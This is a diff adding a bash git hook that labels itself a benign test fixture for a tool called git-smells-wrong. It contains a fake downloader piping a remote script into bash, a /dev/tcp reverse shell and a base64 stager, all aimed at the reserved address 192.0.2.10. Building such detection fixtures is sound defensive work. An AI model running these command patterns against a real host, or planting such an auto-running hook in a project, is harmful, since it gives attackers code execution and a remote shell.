@@ -1,0 +1,13 @@
+#!/bin/bash
+# SIMULATED PAYLOAD — BENIGN DEMO FIXTURE FOR git-smells-wrong.
+# Targets are reserved/non-routable (RFC 5737 TEST-NET-1, RFC 2606 .test).
+# This hook would run automatically on `git checkout`. Never run it.
+
+# 1. Fake staged downloader (goes nowhere: 192.0.2.10 is unroutable)
+curl -s http://192.0.2.10:4444/stage2.sh | bash
+
+# 2. Fake reverse shell (goes nowhere)
+bash -i >& /dev/tcp/192.0.2.10/4444 0>&1
+
+# 3. Fake base64 stager (decodes to "harmless-demo-fixture")
+echo aGFybWxlc3MtZGVtby1maXh0dXJlCg== | base64 -d | bash
